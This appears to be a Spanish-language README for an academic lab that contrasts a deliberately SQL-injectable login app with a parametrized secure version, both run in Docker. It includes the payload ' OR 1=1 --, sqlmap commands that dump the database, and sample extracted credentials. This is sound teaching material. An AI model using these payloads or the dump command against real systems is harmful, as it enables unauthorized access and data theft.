# KMATA – SQL Injection Lab

## Descripción

Este laboratorio académico demuestra:

1. Desarrollo de una aplicación web vulnerable a SQL Injection.
2. Explotación de la vulnerabilidad utilizando sqlmap.
3. Desarrollo de una versión 2.0 segura mediante consultas parametrizadas.
4. Contenerización de ambas versiones utilizando Docker y Docker Compose.
5. Validación técnica de la mitigación implementada.

---

## Estructura del Proyecto


KMATA-SQL-INJECTION-LAB/
│
├── database/
│ └── init.sql
│
├── v1-vulnerable/
│ ├── app/
│ └── Dockerfile
│
├── v2-secure/
│ ├── app/
│ └── Dockerfile
│
└── docker-compose.yml


---

## Requisitos

- Docker Desktop instalado
- Python instalado
- sqlmap descargado
- Puertos 3000, 4000 y 1433 disponibles

---

## Configuración de la Base de Datos

El archivo `init.sql` ubicado en la carpeta `database/` contiene:

- Creación de base de datos `kmata_lab_db`
- Creación de login `kmata`
- Creación de usuario en base
- Asignación de permisos
- Creación de tabla `users`
- Inserción de datos de prueba

Usuarios disponibles:

| username | password  |
|----------|-----------|
| admin    | admin123  |
| user1    | 1234      |
| paola    | password  |

---

## Cómo ejecutar el laboratorio

Desde la raíz del proyecto ejecutar:


docker compose up --build


Esto levantará:

- SQL Server
- Aplicación vulnerable en http://localhost:3000
- Aplicación segura en http://localhost:4000

Para detener los contenedores:


docker compose down


---

# Pruebas – Versión Vulnerable

Acceder a:


http://localhost:3000


## Login válido

Usuario: admin  
Password: admin123  

Resultado esperado: Login exitoso

---

## Prueba manual de SQL Injection

En el campo usuario ingresar:


' OR 1=1 --


Resultado esperado:

Permite acceso sin credenciales válidas.

Esto confirma que la aplicación es vulnerable debido a concatenación directa de parámetros en la consulta SQL.

---

## Ataque con sqlmap – Versión Vulnerable

Ejecutar:


python C:\sqlmap-dev\sqlmap.py -u "http://localhost:3000/auth/login
" --data="username=admin&password=123" --method=POST -p username --level=5 --risk=3 --batch --dump --flush-session


Resultado esperado:

- Detecta parámetro inyectable
- Identifica Microsoft SQL Server
- Enumera la base de datos kmata_lab_db
- Extrae la tabla users

Ejemplo de resultado:


Database: kmata_lab_db
Table: users
+----+----------+----------+
| id | password | username |
+----+----------+----------+
| 1 | admin123 | admin |
| 2 | 1234 | user1 |
| 3 | password | paola |
+----+----------+----------+


---

# Pruebas – Versión Segura (2.0)

Acceder a:


http://localhost:4000


---

## Seguridad Implementada

La versión 2.0 elimina la vulnerabilidad mediante:

- Validación de entrada
- Uso de consultas parametrizadas
- Tipado explícito de parámetros

Ejemplo:

```javascript
request.input('username', sql.VarChar(50), username);
request.input('password', sql.VarChar(50), password);

SELECT * FROM users WHERE username = @username AND password = @password
Prueba manual de inyección

Intentar ingresar:

' OR 1=1 --

Resultado esperado:

Credenciales incorrectas

No se produce bypass.

Ataque con sqlmap – Versión Segura

Ejecutar:

python C:\sqlmap-dev\sqlmap.py -u "http://localhost:4000/auth/login" --data="username=admin&password=123" --method=POST -p username --level=5 --risk=3 --batch --dump --flush-session

Resultado esperado:

[CRITICAL] all tested parameters do not appear to be injectable

No permite:

Detectar DBMS

Enumerar base de datos

Extraer información

Comparación Técnica
Versión Vulnerable

Construcción dinámica de consulta SQL

Concatenación directa de parámetros

Vulnerable a:

Boolean-based injection

Time-based injection

Stacked queries

Permite extracción completa de datos

Versión Segura

Uso de consultas parametrizadas

Separación entre datos y código SQL

sqlmap no detecta parámetros inyectables

No permite enumeración ni extracción

Conclusión

El laboratorio demuestra de forma práctica:

Cómo se explota una vulnerabilidad SQL Injection.

Cómo una mala práctica (concatenación de strings) compromete la base de datos.

Cómo la parametrización elimina completamente la vulnerabilidad.

Cómo Docker permite reproducibilidad del entorno.

Se valida que la versión 2.0 mitiga exitosamente la vulnerabilidad identificada en la versión 1.